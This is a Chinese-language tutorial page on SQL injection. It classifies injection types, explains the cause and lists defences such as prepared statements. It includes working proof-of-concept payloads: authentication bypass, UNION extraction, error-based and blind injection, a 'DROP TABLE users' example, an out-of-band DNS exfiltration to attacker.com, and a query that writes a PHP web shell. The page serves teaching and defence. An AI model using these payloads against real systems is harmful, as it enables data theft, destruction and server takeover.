# SQL注入

## SQL 注入

### 一、漏洞定义

SQL 注入（SQL Injection）是指攻击者通过构造恶意 SQL 语句，将其注入 Web 应用程序中，最终在后台数据库执行非预期命令的行为，从而达到读取、修改、删除数据库内容，甚至控制服务器的目的。

***

### 二、常见类型分类

| 类型    | 描述                                     |
| ----- | -------------------------------------- |
| 数字型注入 | 参数为纯数字（如 id=1）                         |
| 字符型注入 | 参数包含字符串（如 name='admin'）                |
| 报错注入  | 利用数据库的报错信息泄露结构信息                       |
| 盲注    | 页面无报错信息，但可通过布尔或时间判断注入成功                |
| 联合注入  | 使用 `UNION SELECT` 合并查询结果数据             |
| 堆叠注入  | 使用 `;` 执行多条语句（如 `1; DROP TABLE users`） |
| 二次注入  | 恶意语句存入数据库后在未来某次查询中被执行                  |
| 内联注入  | 注入点存在于嵌套子查询或复杂语句中                      |
| 带外注入  | 触发数据库产生外部请求（如 DNS/HTTP）用于传出数据          |

***

### 三、漏洞原理详解

SQL 注入的本质是“用户输入被拼接进 SQL 查询语句中，未经过正确处理”，从而使攻击者能够控制查询的结构或内容。

例如：

```sql
query = "SELECT * FROM users WHERE username = '" + user_input + "'"
```

若 `user_input = admin'--`，则最终查询为：

```sql
SELECT * FROM users WHERE username = 'admin'--'
```

其中 `'--` 注释了原本查询结构中的剩余部分，绕过了认证逻辑。

***

### 四、典型实例（含 POC）

#### 1. 数字型注入

```http
http://example.com/item.php?id=1 OR 1=1
```

联合注入：

```sql
?id=1 UNION SELECT 1, database(), user(), version()
```

***

#### 2. 字符型注入

```http
http://example.com/login.php?user=admin'--&pass=123
```

后台 SQL：

```sql
SELECT * FROM users WHERE user='admin'--' AND pass='123'
```

***

#### 3. 报错注入（MySQL）

```sql
?id=1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT user()), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

***

#### 4. 布尔盲注

```http
?id=1 AND 1=1     // 页面正常
?id=1 AND 1=2     // 页面异常
```

用于逐位判断敏感信息。

***

#### 5. 时间盲注

```sql
?id=1 AND IF(SUBSTR(user(),1,1)='r', SLEEP(3), 0)
```

响应延迟说明判断为真。

***

#### 6. 带外注入（Out-of-Band）

```sql
?id=1 AND LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.attacker.com\\'))
```

或使用 `xp_dirtree`, `dnslookup`, `UTL_HTTP.REQUEST` 等方法触发外部连接，从而传出数据。

***

#### 7. 利用写入 WebShell（MySQL）

```sql
?id=1 UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
```

条件：

* 具备 `FILE` 权限
* 目标目录可写
* 服务器运行的是 Apache/Nginx 并可解析 PHP

***

### 五、利用方式

* 绕过身份验证
* 获取数据库信息（库名、表名、字段、数据）
* 写入 WebShell 实现服务器控制
* 利用带外通道传出数据（如 DNS 回传）

***

### 六、防御与修复方式

* 预编译 （sql注入只对sql语句的编译有破坏作用。而PreparedStatement已经准备好了,执行阶段只是把输入串作为数据处理,而不再对sql语句进行解析。但预编译不能解决全部的问题，比如orderby后面的参数其实无法通过预编译解决）
* 字符串过滤
* 禁用危险函数（ `load_file`, `into outfile`）

***
